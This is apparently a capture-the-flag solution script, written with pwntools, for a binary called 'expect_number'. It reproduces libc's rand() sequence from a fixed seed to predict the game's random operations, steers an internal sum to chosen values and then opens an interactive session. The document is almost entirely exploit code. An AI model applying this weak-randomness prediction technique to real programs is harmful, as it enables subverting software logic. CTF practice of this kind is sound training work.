#!/usr/bin/env python3

from pwn import *
from ctypes import *
import ast
# from LibcSearcher import *

context(arch="amd64", os="linux", log_level="info")
context.terminal = ["tmux", "splitw", "-h"]

s = lambda content: io.send(content)
sl = lambda content: io.sendline(content)
sa = lambda content, send: io.sendafter(content, send)
sla = lambda content, send: io.sendlineafter(content, send)
rc = lambda number: io.recv(number)
ru = lambda content: io.recvuntil(content)


def slog(name, address):
    print("\033[40;31m[+]\033[40;35m" + name + "==>" + hex(address) + "\033[0m")


def debug(content=""):
    if content == "":
        gdb.attach(io)
    else:
        gdb.attach(io, content)


def get_address():
    return u64(ru(b"\x7f")[-6:].ljust(8, b"\x00"))


io = process("./expect_number")


def cont_the_game(choice):
    sla("choice \n", "1")
    randnum = elf.rand() % 4 + 1
    if randnum == 4:
        choice = 1
    sla("or 0", str(choice))


sum = 0


def count_game(choice):
    global sum
    sla("choice \n", "1")
    randnum = elf.rand() % 4 + 1
    if randnum == 4:
        sum /= choice
        print(f"randnum: {randnum}, div, sum, {sum}")
    elif randnum == 1:
        sum += choice
        print(f"randnum: {randnum}, add, sum, {sum}")
    elif randnum == 2:
        sum -= choice
        print(f"randnum: {randnum}, minus, sum, {sum}")
    elif randnum == 3:
        sum *= choice
        print(f"randnum: {randnum}, mult, sum, {sum}")
    sla("or 0", str(choice))


def show():
    sla("choice \n", "2")


def submit():
    sla("choice \n", "3")


elf = cdll.LoadLibrary("/usr/lib/libc.so.6")
elf.srand(1)

for i in range(7):
    cont_the_game(0)

count_game(2)  # add, sum, 2
count_game(0)  # minus, sum, 2
count_game(0)  # minus, sum, 2
count_game(2)  # mult, sum, 4
count_game(1)  # div, sum, 4.0
count_game(2)  # mult, sum, 8.0
count_game(1)  # div, sum, 8.0
count_game(1)  # div, sum, 8.0
count_game(2)  # mult, sum, 16.0
count_game(2)  # add, sum, 18.0
count_game(2)  # mult, sum, 36.0
count_game(2)  # add, sum, 38.0
count_game(2)  # add, sum, 40.0
count_game(1)  # div, sum, 40.0
count_game(2)  # add, sum, 42.0
count_game(1)  # div
count_game(1)  # minus
# debug("b *$rebase(0x2b94)")
count_game(2)  # mult
count_game(1)  # mult
count_game(1)  # div
count_game(1)  # div
count_game(1)  # div
count_game(1)  # div
count_game(1)  # minus
count_game(2)  # mult

submit()

io.interactive()
